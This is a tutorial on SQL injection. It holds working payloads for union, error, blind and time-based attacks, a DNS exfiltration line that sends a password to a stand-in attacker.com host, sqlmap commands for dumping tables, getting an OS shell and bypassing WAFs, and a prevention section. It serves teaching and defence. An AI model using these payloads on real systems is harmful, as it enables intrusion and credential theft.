# SQL Injection (SQLi)

SQL Injection is one of the most dangerous and prevalent web vulnerabilities. It allows an attacker to interfere with the queries an application makes to its database — potentially reading, modifying, or deleting data, and in some cases achieving Remote Code Execution.

## How It Works

When user input is directly concatenated into a SQL query without sanitization:

```php
// VULNERABLE CODE
$username = $_POST['username'];
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

An attacker inputs: `admin' --`

The query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
```

The `--` comments out the password check. The attacker logs in as admin with no password.

## Types of SQL Injection

### 1. In-Band SQLi (Classic)
Results are returned directly in the application's response.

**Union-Based:** Uses UNION to append results from another query.
```sql
' UNION SELECT 1,username,password,4 FROM users --
```

**Error-Based:** Forces the database to reveal information in error messages.
```sql
' AND extractvalue(1, concat(0x7e, (SELECT version()))) --
```

### 2. Blind SQLi
No visible output — you infer information from the application's behavior.

**Boolean-Based:** Ask true/false questions.
```sql
' AND 1=1 --    → Page loads normally (TRUE)
' AND 1=2 --    → Page changes or breaks (FALSE)

' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' --
```

**Time-Based:** Use delays to extract data.
```sql
' AND SLEEP(5) --                          → MySQL
' AND 1=1; WAITFOR DELAY '0:0:5' --        → MSSQL
' AND 1=1; SELECT pg_sleep(5) --           → PostgreSQL
```

### 3. Out-of-Band SQLi
Data is exfiltrated through a different channel (DNS, HTTP requests). Used when in-band and blind methods are too slow.

```sql
-- MySQL: DNS exfiltration
' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share')) --
```

## Step-by-Step: Manual SQLi

### Step 1: Detect the Vulnerability
```
Input: '
Response: SQL syntax error → VULNERABLE

Input: ''
Response: Normal → Likely vulnerable (escaped quote)

Input: ' OR '1'='1
Response: All records returned → VULNERABLE
```

### Step 2: Determine Number of Columns
```sql
' ORDER BY 1 --    → Works
' ORDER BY 2 --    → Works
' ORDER BY 3 --    → Works
' ORDER BY 4 --    → Error! → 3 columns
```

### Step 3: Find Visible Columns
```sql
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT 'a',NULL,NULL --    → If 'a' appears, column 1 is visible
' UNION SELECT NULL,'a',NULL --    → If 'a' appears, column 2 is visible
```

### Step 4: Extract Data
```sql
-- Get database version
' UNION SELECT NULL,version(),NULL --

-- Get all tables
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database() --

-- Get columns from a table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users' --

-- Get credentials
' UNION SELECT NULL,concat(username,':',password),NULL FROM users --
```

## SQLMap — Automated Exploitation

```bash
# Basic detection and exploitation
sqlmap -u "http://target.com/page?id=1" --dbs

# POST request
sqlmap -u "http://target.com/login" --data="username=admin&password=test" --dbs

# Dump a specific database
sqlmap -u "http://target.com/page?id=1" -D mydb --tables
sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump

# Get OS shell (if privileged)
sqlmap -u "http://target.com/page?id=1" --os-shell

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between --random-agent
```

<InfoBox type="tip">
Always start with manual testing to understand the injection point, then use SQLMap to automate extraction. Blindly running SQLMap can trigger WAFs and get you blocked.
</InfoBox>

## Prevention

```php
// VULNERABLE
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// SECURE: Prepared Statements (Parameterized Queries)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);

// SECURE: Stored Procedures
$stmt = $pdo->prepare("CALL GetUser(?)");
$stmt->execute([$_GET['id']]);
```

<InfoBox type="important">
**Prepared statements** are the gold standard defense against SQLi. Input validation and WAFs are secondary defenses — never rely on them alone.
</InfoBox>
